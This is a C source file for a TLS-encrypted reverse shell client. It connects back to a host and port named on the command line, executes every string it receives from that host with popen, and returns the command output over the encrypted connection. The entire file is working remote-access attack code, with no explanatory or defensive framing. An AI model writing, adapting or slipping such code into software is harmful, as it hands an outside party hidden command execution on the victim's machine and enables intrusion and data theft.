#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

int sockfd = -1; // Make sockfd global for signal handler
SSL *ssl = NULL; // Make ssl global for signal handler
SSL_CTX *ctx = NULL; // Make ctx global for cleanup

void handle_sigint(int sig) {
    printf("\nCaught Ctrl+C (SIGINT). Closing connection...\n");
    if (ssl) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }
    if (ctx) {
        SSL_CTX_free(ctx);
    }
    if (sockfd != -1) {
        close(sockfd);
    }
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    // Register signal handler
    signal(SIGINT, handle_sigint);

    // Initialize OpenSSL
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    const SSL_METHOD *method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    struct sockaddr_in server_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        SSL_CTX_free(ctx);
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sockfd);
        SSL_CTX_free(ctx);
        return 1;
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sockfd);
        SSL_CTX_free(ctx);
        return 1;
    }

    // Create SSL object and connect
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);
    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(sockfd);
        return 1;
    }

    printf("Connected to %s:%d (TLS)\n", ip, port);
    printf("Press Ctrl+C to exit and close the connection.\n");

    char buffer[1024];
    ssize_t nbytes;

    while (1) {
        nbytes = SSL_read(ssl, buffer, sizeof(buffer)-1);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            // Execute the received command using bash
            FILE *fp = popen(buffer, "r");
            if (fp == NULL) {
                char *err = "Failed to execute command.\n";
                SSL_write(ssl, err, strlen(err));
                continue;
            }

            // Read command output and send it back
            char cmd_output[2048];
            size_t bytes_read;
            while ((bytes_read = fread(cmd_output, 1, sizeof(cmd_output)-1, fp)) > 0) {
                SSL_write(ssl, cmd_output, bytes_read);
            }
            SSL_write(ssl, "\n", 1);
            pclose(fp);
        } else if (nbytes == 0) {
            printf("Server closed the connection.\n");
            break;
        } else {
            perror("SSL_read");
            break;
        }
    }

    // Cleanup
    if (ssl) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }
    if (ctx) {
        SSL_CTX_free(ctx);
    }
    if (sockfd != -1) {
        close(sockfd);
    }
    return 0;
}